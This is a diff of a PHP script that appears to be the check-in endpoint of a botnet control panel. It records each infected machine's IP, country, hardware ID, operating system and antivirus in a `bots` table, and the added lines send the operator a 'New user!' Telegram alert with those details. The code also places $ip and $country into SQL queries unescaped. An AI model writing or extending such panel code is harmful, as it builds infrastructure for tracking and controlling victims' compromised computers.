@@ -1,5 +1,6 @@
 <?php
 include('connect.php');
+
 $hwid = $_GET['hwid'];
 $os = $_GET['os'];
 $av = $_GET['av'];
@@ -43,22 +44,17 @@ if(mysqli_num_rows($check) > 0)
         mysqli_free_result($result);
     }
 } else {
-    mysqli_query($mysqli, "
-    INSERT INTO `countries` 
-    SET `country`='$country', 
-        `value`='" . mysqli_real_escape_string($mysqli, '1') . "'
-");
+    mysqli_query($mysqli, "INSERT INTO `countries` SET `country`='$country', `value`='" . mysqli_real_escape_string($mysqli, '1') . "'");
 }
 
-mysqli_query($mysqli, "
-    INSERT INTO `bots` 
-    SET `ip`='" . $ip . "', 
-        `country`='$country', 
-        `hwid`='" . mysqli_real_escape_string($mysqli, $hwid) . "', 
-        `checked`='false',
-        `OS`='" . mysqli_real_escape_string($mysqli, $os) . "',
-        `AV`='" . mysqli_real_escape_string($mysqli, $av) . "'
-");
+mysqli_query($mysqli, "INSERT INTO `bots` SET `ip`='" . $ip . "', `country`='$country', `hwid`='" . mysqli_real_escape_string($mysqli, $hwid) . "', `checked`='false', `OS`='" . mysqli_real_escape_string($mysqli, $os) . "', `AV`='" . mysqli_real_escape_string($mysqli, $av) . "'");
 
-mysqli_close($mysqli);    
+if(mysqli_num_rows(mysqli_query($mysqli, "SELECT * FROM `telegram`")) > 0)
+{
+    include('send.php');
+    send_mess("New user!\nIP: $ip\nCountry: $country\nHWID: $hwid\nOS: $os\nAV: $av", $token, $chatid);
+}
+
+mysqli_close($mysqli);
+Clean();
 ?>
